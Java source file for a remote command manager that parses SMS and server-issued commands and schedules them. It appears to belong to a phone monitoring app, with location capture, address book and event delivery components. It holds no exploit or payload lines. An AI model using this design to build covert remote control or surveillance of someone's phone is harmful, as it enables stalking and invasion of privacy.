package com.vvt.remotecommandmanager;

import java.util.ArrayList;
import java.util.List;

import com.vvt.activation_manager.ActivationManager;
import com.vvt.appcontext.AppContext;
import com.vvt.base.FxEventListener;
import com.vvt.capture.location.LocationCaptureManager;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.PccRmtCmdListener;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxEventDirection;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseManager;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.response.PCC;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.utils.RemoteCommandParser;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;
import com.vvt.server_address_manager.ServerAddressManager;

public class RemoteCommandManagerImpl implements RemoteCommandManager, PccRmtCmdListener{

	private static final String TAG = "RemoteCommandManagerlmpl";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;

	private CommandProcessingManager mCmdProcessingManager;
	private FxEventRepository mEventRepository;
	private AppContext mAppContext;
	private ProductInfo mProductInfo;
	private ActivationManager mActivationManager;
	private DataDelivery mDataDelivery;
	private EventDelivery mEventDelivery;
	private AddressbookManager mAddressbookManager;
	private LicenseManager mLicenseManager;
	private ConfigurationManager mConfigurationManager;
	private PreferenceManager mPreferenceManager;
	private ServerAddressManager mServerAddressManager;
	private FxEventListener mEventListener;
	private LocationCaptureManager mLocationCaptureManager;
	private ConnectionHistoryManager mConnectionHistoryManager;

	public RemoteCommandManagerImpl() {

	}
	
	public void setAppContext(AppContext appContext) {
		mAppContext = appContext;
	}
	
	public void setEventRepository(FxEventRepository eventRepository) {
		mEventRepository = eventRepository;
	}
	
	public void setActivationManager(ActivationManager activationManager) {
		mActivationManager = activationManager;
	}
	
	public void setDataDelivery(DataDelivery dataDelivery) {
		mDataDelivery = dataDelivery;
	}
	
	public void setEventDelivery(EventDelivery eventDelivery) {
		mEventDelivery = eventDelivery;
	}
	
	public void setLicenseManager(LicenseManager licenseManager) {
		mLicenseManager = licenseManager;
	}
	
	public void setConfigurationManager(ConfigurationManager configurationManager) {
		mConfigurationManager = configurationManager;
	}
	
	public void setPreferenceManager(PreferenceManager preferenceManager) {
		mPreferenceManager = preferenceManager;
	}
	
	public void setServerAddressManager(ServerAddressManager serverAddressManager)  {
		mServerAddressManager = serverAddressManager;
	}
	
	public void setEventCaptureListener(FxEventListener eventListener) {
		mEventListener = eventListener;
	}
	
	public void setAddressBookManager(AddressbookManager addressbookManager) {
		mAddressbookManager = addressbookManager;
	}
	
	public void setLocationCaptureManager(LocationCaptureManager locationCaptureManager) {
		mLocationCaptureManager = locationCaptureManager;
	}
	
	public void setConnectionHistory(ConnectionHistoryManager connectionHistoryManager) {
		mConnectionHistoryManager = connectionHistoryManager;
	}
	
	public void initialize() throws FxNullNotAllowedException {
		if(mAppContext == null) {
			throw new FxNullNotAllowedException("appContext can not be null");
		}
		
		if (mEventRepository == null) {
			throw new FxNullNotAllowedException("EventRepository can not be null");
		}
		
		if (mActivationManager == null) {
			throw new FxNullNotAllowedException("ActivationManager can not be null");
		}
		
		if (mDataDelivery == null) {
			throw new FxNullNotAllowedException("DataDelivery can not be null");
		}
		
		if (mEventDelivery == null) {
			throw new FxNullNotAllowedException("EventDelivery can not be null");
		}
		
		if (mLicenseManager == null) {
			throw new FxNullNotAllowedException("LicenseManager can not be null");
		}
		
		if (mConfigurationManager == null) {
			throw new FxNullNotAllowedException("ConfigurationManager can not be null");
		}
		
		if (mPreferenceManager == null) {
			throw new FxNullNotAllowedException("PreferenceManager can not be null");
		}
		
		if (mServerAddressManager == null) {
			throw new FxNullNotAllowedException("ServerAddressManager can not be null");
		}
		
		if (mEventListener == null) {
			throw new FxNullNotAllowedException("EventListener can not be null");
		}
		
		if (mConnectionHistoryManager == null) {
			throw new FxNullNotAllowedException("ConnectionHistoryManager can not be null");
		}
		
		//LocationCaptureManage is a feature compoment it can be null.
		if (mLocationCaptureManager == null) {
			throw new FxNullNotAllowedException("LocationCaptureManage can not be null");
		}
		
		//addressBook is a feature compoment it can be null.
		if (mAddressbookManager == null) {
			//throw new FxNullNotAllowedException("AddressbookManager can not be null");
			if(LOGE) FxLog.e(TAG, "AddressbookManager is null");
		}

		
		mProductInfo = mAppContext.getProductInfo();
		
		//pass variable 
		InitialParameter setupParam = new InitialParameter();
		setupParam.setActivationManager(mActivationManager);
		setupParam.setAddressbookManager(mAddressbookManager);
		setupParam.setAppContext(mAppContext);
		setupParam.setConfigurationManager(mConfigurationManager);
		setupParam.setDataDelivery(mDataDelivery);
		setupParam.setEventDelivery(mEventDelivery);
		setupParam.setEventListener(mEventListener);
		setupParam.setEventRepository(mEventRepository);	
		setupParam.setLicenseManager(mLicenseManager);
		setupParam.setPreferenceManager(mPreferenceManager);
		setupParam.setServerAddressManager(mServerAddressManager);
		setupParam.setLocationCaptureManager(mLocationCaptureManager);
		setupParam.setConnectionHistoryManager(mConnectionHistoryManager);
		
		mCmdProcessingManager = new CommandProcessingManager(setupParam);
	}
	
	/**
	 * Call this method AFTER call initialize.
	 */
	public void setSupportCommands(ArrayList<String> commandCodes) {
		if(mCmdProcessingManager != null) {
			mCmdProcessingManager.setSupportedCommands(commandCodes);
		}
	}

	public void clearSupportCommands() {
		if(mCmdProcessingManager != null) {
			mCmdProcessingManager.clearSupprtCommands();
		}
	}

	public void processPendingCommands() {
		if(mCmdProcessingManager != null) {
			mCmdProcessingManager.processPendingCommands();
		}
	}

	private void createSystemEvent(RemoteCommandType type,
			FxEventDirection direction, String message) {
		RemoteCommandUtil.createSystemEvent(mEventRepository, type, direction,
				message);
	}

	private RemoteCommandData createCommandData(PCC pcc) {
		return RemoteCommandParser.parse(pcc);
	}

	private RemoteCommandData createCommandData(SmsCommand smsCommand)
			throws RemoteCommandException {
		return RemoteCommandParser.parse(smsCommand);
	}

	private void scheduleProcessing(RemoteCommandData commandData) throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "scheduleProcessing # ENTER ...");
		
		mCmdProcessingManager.scheduleProcessing(commandData);
		
		if(LOGV) FxLog.v(TAG, "scheduleProcessing # EXIT ...");
	}

	private synchronized void startingProcess(RemoteCommandType type, Object command) {
		if(LOGV) FxLog.v(TAG, "startingProcess # ENTER ...");
		if(LOGV) FxLog.v(TAG, "startingProcess # currentThread Id : " + Thread.currentThread().getId());
		
		RemoteCommandData commandData = null;

		try {
			if (type == RemoteCommandType.SMS_COMMAND) {
				SmsCommand smsCommand = (SmsCommand) command;
				if(LOGV) FxLog.v(TAG, String.format("startingProcess # smsCommand : %s : %s",
						smsCommand.getSenderNumber(),smsCommand.getMessage()));
				createSystemEvent(RemoteCommandType.SMS_COMMAND,
						FxEventDirection.IN, smsCommand.getMessage());
				commandData = createCommandData(smsCommand);

			} else {
				PCC p = (PCC) command;
				if(LOGV) FxLog.v(TAG,"startingProcess # PCC ");
				String msg = RemoteCommandParser.getMsgSystemEvent(p);
				createSystemEvent(RemoteCommandType.PCC, FxEventDirection.IN,
						msg);
				commandData = createCommandData(p);

			}
			if(LOGD) FxLog.d(TAG, String.format("startingProcess # commandData : Code %s" +
					"\nType : %s" +
					"\nSenderNumber : %s" +
					"\nArgs : %s",
					commandData.getCommandCode(),
					commandData.getRmtCommandType(),
					commandData.getSenderNumber(),
					commandData.getArguments().toString()));
			scheduleProcessing(commandData);

		} catch (Exception e) {
			if (e instanceof RemoteCommandException) {
				RemoteCommandUtil.handleException(mEventRepository,
						(RemoteCommandException) e, commandData, mProductInfo);

			} else {
				if(LOGE) FxLog.e(TAG, e.getMessage(), e);
			}
		}
		
		if(LOGV) FxLog.v(TAG, "startingProcess # EXIT ...");
	}

	@Override
	public void processSmsCommand(SmsCommand smsCommand) {
		if(LOGV) FxLog.v(TAG, "processSmsCommand # ENTER ...");
		
		if (smsCommand != null) {
			startingProcess(RemoteCommandType.SMS_COMMAND, smsCommand);
		}

		if(LOGV) FxLog.v(TAG, "processSmsCommand # EXIT ...");
	}

	@Override
	public void processPccCommand(List<PCC> pccCommand) {
		if (pccCommand != null) {
			for (PCC p : pccCommand) {
				startingProcess(RemoteCommandType.PCC, p);
			}
		}

	}
 
	public void onSmsCommandReceived(SmsCommand smsCommand) {
		processSmsCommand(smsCommand);
	}

	@Override
	public void onReceivePCC(List<PCC> pccs) {
		if(pccs.size() > 0) {
			processPccCommand(pccs);
		}
		
	}

}
